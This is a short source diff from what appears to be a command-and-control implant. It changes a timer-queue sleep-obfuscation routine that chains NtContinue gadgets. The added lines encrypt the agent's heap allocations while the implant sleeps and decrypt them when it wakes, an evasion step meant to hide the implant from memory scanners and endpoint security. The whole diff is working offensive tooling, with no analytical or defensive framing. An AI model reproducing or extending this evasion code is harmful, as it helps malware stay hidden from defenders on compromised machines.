@@ -181,10 +181,20 @@ auto DECLFN Mask::Timer(
         Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Mk->Ctx.NtContinueGadget, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
     }
 
+    if ( Self->Hp->Obfuscate ) {
+        KhDbg( "obfuscating heap allocation from agent" );
+        Self->Hp->Crypt();
+    }
+
     KhDbg( "trigger obf chain\n\n" );
 
     NtStatus = Self->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, NULL );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
+
+    if ( Self->Hp->Obfuscate ) {
+        KhDbg( "deobfuscating heap allocation from agent" );
+        Self->Hp->Crypt();
+    }
 
 _KH_END:
     if ( DupThreadHandle ) Self->Ntdll.NtClose( DupThreadHandle );
